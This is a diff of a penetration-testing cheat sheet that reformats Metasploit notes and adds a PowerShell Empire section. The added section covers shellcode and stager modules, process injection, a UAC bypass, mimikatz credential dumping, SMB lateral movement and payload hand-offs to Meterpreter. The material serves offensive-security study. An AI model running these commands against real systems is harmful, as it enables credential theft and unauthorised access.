@@ -38,6 +38,7 @@ EasyG started out as a script that I use to automate some information gathering 
     - [MSF Syntax](#msf-syntax)
     - [Exploit Modules](#exploit-modules)
     - [Post-Exploitation](#post-exploitation)
+  - [PowerShell Empire](#powershell-empire)
   - [Others](#others)
 - [Passive Information Gathering (OSINT)](#passive-information-gathering-osint)
   - [Notes](#notes)
@@ -696,11 +697,11 @@ tcpdump -nX -r packets.pcap                                                     
 
 
 
-## Metasploit Framework
+### <ins>Metasploit Framework</ins>
 
 See: [The Metasploit Framework](https://www.metasploit.com/)
 
-### <ins>Starting Metasploit</ins>
+#### Starting Metasploit
 
 ```
 sudo systemctl start postgresql                                start postgresql manually
@@ -711,7 +712,7 @@ sudo msfconsole -q                                             start the Metaspl
 ```
 
 
-### <ins>MSF Syntax</ins>
+#### MSF Syntax
 
 ```
 show -h                                  help flag
@@ -740,7 +741,7 @@ To interact with a module
   - `kill` kill job
 
 
-### <ins>Exploit Modules</ins>
+#### <ins>Exploit Modules</ins>
 
 #### Staged vs Non-Staged Payloads
 
@@ -761,7 +762,7 @@ To interact with a module
   - Works for all single and multi-stage payloads
   - Specify the incoming payload type
 
-### <ins>Post-Exploitation</ins>
+#### <ins>Post-Exploitation</ins>
 
 ```
 screenshot                take a screenshot of the compromised host desktop
@@ -782,6 +783,49 @@ keyscan_stop              stop the keystroke sniffer
 **Port forwarding**
 - `meterpreter> portfwd -h`
   - Example `portfwd add -l 3389 -p 3389 -r 192.168.1.121`
+
+
+
+### <ins>PowerShell Empire</ins>
+
+Focused on Windows exploitation, you can find PowerShell Empire [here](https://github.com/EmpireProject/Empire) (no longer supported by the original developers). A forked and updated version is [BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire).
+
+- `listeners` list all currently active listeners. Listeners accept inbound connections from various Empire agents
+- `uselistener` empty to list all listeners, give an input to set a listener (example: `uselistener http`)
+- `usestager` empty to list all stagers, give an input to set a stager (example: `usestager windows/launcher_bat`)
+- `usemodule` empty to list all modules, give an input to set a module (example: `usemodule code_execution/invoke_shellcode`)
+- When a listener / stager / module is set, use `info` to display information and syntax
+- `set` to configure the options
+- `agents` to display all active agents
+- `interact <name agent>` to interact with an active agent
+- Migrate the payload to a target process with `ps` and `psinject <listener name> <target process>`
+
+**Credentials and Privilege Escalation**
+- `usemodule powershell/privesc/powerup/allchecks` use the "PowerUp allchecks" module. It employs a variety of methods based on errors, including unquoted service paths, incorrect permissions on service executables, and more
+- `usemodule privesc/bypassuac_fodhelper` depending on the local Windows version and whether we have access to a local administrator account, this module can launch a high-integrity PowerShell Empire agent without going through UAC
+- Once we've established a high-integrity session, we can carry out operations that call for SYSTEM or local administrator rights, like dump credentials with mimikatz. Example:
+  1. `interact K764VC11`
+  2. `usemodule credentials/` here you find multiple mimikatz commands that have been ported into Empire
+     - `usemodule credentials/mimikatz/logonpasswords`
+     - `execute`
+     - `sekurlsa::logonpasswords`
+  3. `creds` display credentials store. Use `creds add` to manually enter data into the credentials store
+
+**Lateral Movement**: `usemodule lateral_movement/technique`
+- An example `(Empire: K764VC11) > usemodule lateral_movement/invoke_smbexec`
+
+**Switching Between Empire and Metasploit**
+- Available only until version `2.4`
+
+From PowerShell Empire to Metasploit
+1. If PowerShell Empire agent is active on the host, it's possible to use msfvenom to generate a meterpreter shell as an exe and then set a listener
+2. From the PowerShell Empire shell, upload the executable
+3. Use `dir` shell command to reveal its location and execute it
+
+From Metasploit to Powershell Empire
+1. Create a launcher with Powershell Empire
+2. From meterpreter, upload the launcher and execute it
+   - `upload` > `shell` > `dir` > `launcher.bat`
 
 
 
